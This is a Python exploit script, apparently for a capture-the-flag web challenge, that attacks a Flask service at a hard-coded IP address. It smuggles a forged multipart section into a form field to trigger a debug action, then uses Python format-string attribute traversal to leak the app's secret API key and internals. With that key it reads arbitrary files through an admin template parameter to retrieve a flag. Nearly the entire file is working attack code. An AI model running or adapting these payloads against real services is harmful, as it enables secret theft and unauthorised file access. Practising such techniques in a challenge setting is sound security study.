import httpx
import subprocess
import re

TARGET = "http://223.6.249.127:12560"
BOUNDARY = "---------------------------FlagBoundary123"

def get_api_key():
    fmt_payload = "{0.view_functions[action].__globals__[API_KEY]}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text.strip()

def debug_format(payload):
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = payload + fake_action_part
    if len(text) > 300:
        print(f"[-] Payload too long: {len(text)}")
        return None
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    try:
        r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
        return r.text
    except Exception as e:
        return f"Error: {e}"

def read_file_via_admin(api_key, path):
    headers = {"Authorization": api_key}
    try:
        r = httpx.get(f"{TARGET}/admin", params={"tmpl": path}, headers=headers, timeout=10.0)
        return r.text, r.status_code
    except Exception as e:
        return str(e), 0

if __name__ == "__main__":
    api_key = get_api_key()
    print(f"[+] API_KEY: {api_key}")
    
    # 方法1: 检查 sys.path
    print("\n[*] Reading sys module...")
    # 通过 os 访问 sys
    result = debug_format("{0.view_functions[action].__globals__[os].sys}")
    print(f"os.sys: {result}")
    
    # 直接访问 Flask app 的一些属性
    print("\n[*] Reading Flask app internal...")
    result = debug_format("{0.extensions}")
    print(f"app.extensions: {result}")
    
    result = debug_format("{0.blueprints}")
    print(f"app.blueprints: {result}")
    
    result = debug_format("{0.url_map}")
    print(f"app.url_map: {result}")
    
    # 检查 Jinja 环境的 globals
    result = debug_format("{0.jinja_env.globals}")
    print(f"jinja_env.globals: {result[:300] if result else 'None'}...")
    
    # 看看 httpx 有没有什么有用的属性
    result = debug_format("{0.view_functions[action].__globals__[httpx].Client}")
    print(f"httpx.Client: {result}")
    
    # 重点：检查是否有缓存目录或临时目录
    print("\n[*] Checking for writable locations...")
    
    # 获取真实的 flag 文件名（仅本地测试）
    result = subprocess.run(['docker', 'exec', 'cutter_local', 'ls', '-la', '/'], capture_output=True, text=True)
    print("\n[LOCAL TEST] Root directory:")
    print(result.stdout)
    
    # 从中提取 flag 文件名
    flag_match = re.search(r'flag-[a-f0-9]{32}\.txt', result.stdout)
    if flag_match:
        flag_file = flag_match.group()
        print(f"\n[!] Found flag file: {flag_file}")
        content, code = read_file_via_admin(api_key, f"/{flag_file}")
        print(f"[FLAG] {content}")
